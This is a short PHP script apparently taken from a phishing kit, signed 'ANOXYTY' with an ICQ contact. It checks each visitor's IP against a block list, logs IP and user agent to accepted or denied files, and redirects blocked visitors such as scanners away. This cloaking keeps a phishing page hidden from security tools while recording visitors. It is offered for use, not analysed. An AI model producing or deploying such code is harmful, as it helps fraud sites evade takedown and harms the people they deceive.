<?php
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

$ips = array(	$_SERVER['REMOTE_ADDR'],
);
$useragent = $_SERVER['HTTP_USER_AGENT'];	
$checklist = new IpBlockList( );
foreach ($ips as $ip ) {
	$result = $checklist->ipPass( $ip );
	if ( $result ) {
		$msg = "PASSED: ".$checklist->message();
        $fp = fopen("accepted_visitors.txt", "a");
        fputs($fp, "IP: $ip - OS: $useragent \r\n");
        fclose($fp);	
	}
	else {
		$msg = "FAILED: ".$checklist->message();
		$fp = fopen("denied_visitors.txt", "a");
        fputs($fp, "IP: $ip - OS: $useragent \r\n");
        fclose($fp);
		header("Location: ".$Exit);
		die();
		}
}
?>
